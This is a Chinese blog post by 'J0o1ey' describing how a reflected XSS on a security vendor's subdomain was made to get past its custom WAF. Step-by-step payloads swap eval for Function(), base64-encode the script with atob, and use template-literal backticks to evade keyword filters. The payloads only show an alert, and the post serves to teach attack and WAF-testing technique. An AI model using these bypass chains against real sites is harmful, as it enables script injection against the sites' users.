# 0x00 前言
如果您有技术交流的需求，或对渗透测试、代码审计、红队培训以及红蓝对抗评估等方面感兴趣，请通过QQ/VX-547006660与我联系。

# 0x01 引子
最近在测试一家知名安全厂商时，发现其某重要业务子域竟然部署了自研的WAF（Web应用防火墙）。这引起了我的极大兴趣。进一步研究后，我发现其中一个参数会被直接写入JavaScript中，存在潜在的安全风险。
作者: J0o1ey

# 0x02 初始尝试
首先，我们尝试在没有WAF的情况下进行攻击。如图所示，只需使用三个符号闭合前半部分JS代码，并用`//`注释掉后续代码，然后直接执行JS代码即可。例如：
```javascript
')];eval(alert('xss'))//
```
然而，由于`eval`, `alert`等关键字过于敏感，该Payload被WAF迅速拦截。
作者: J0o1ey

# 0x03 绕过WAF策略
## 替换敏感函数
为了解决`eval`被拦截的问题，可以利用`Function()`构造函数来动态创建并立即执行一段JavaScript代码。`Function()`允许传入多个字符串作为参数，最后一个参数是实际执行的函数体。比如下面两行代码功能相同：
```javascript
var f = new Function("x","y","return x*y");
var f=function(x,y){return x*y};
```
基于此特性，我们可以将原始Payload修改如下：
```javascript
%27]);Function(alert('xss'))()//
```
不幸的是，这种方式仍然无法绕过WAF检测。

### 使用Base64编码
既然直接调用`alert`被阻止，我们可以考虑先将其转换成Base64编码形式再解码执行。例如：
```javascript
atob("YWxlcnQoInhzcyIp")  // base64编码的alert('xss')
```
对应的Payload为：
```javascript
%27]);Function(atob('YWxlcnQoInhzcyIp')))()//
```
但这种方法也未能成功突破WAF限制。

### 利用反引号
最后，考虑到WAF可能正在匹配特定模式（如`atob + ()`），我们转而采用模板字符串（即反引号）替代传统括号加引号的方式：
```javascript
atob`YWxlcnQoInhzcyIp`
```
最终构造出如下有效载荷：
```javascript
%27]);Function(atob`YWxlcnQoInhzcyIp`)()//
```
这一次，成功实现了绕过WAF的目的。
作者: J0o1ey

# 0x04 总结
本次实验展示了如何结合多种技巧来实现XSS漏洞的利用，具体包括：
1. 在JavaScript内部完成闭合与注释；
2. 用`Function()`代替`eval()`；
3. 利用`atob`解密Base64编码后的恶意脚本；
4. 采用模板字符串规避某些关键词的过滤规则。

由此可见，在很多情况下，不是系统本身不存在漏洞，而是攻击者受限于已知的利用链和技术手段。通过巧妙组合各种小技巧，往往能够达到意想不到的效果。
作者: J0o1ey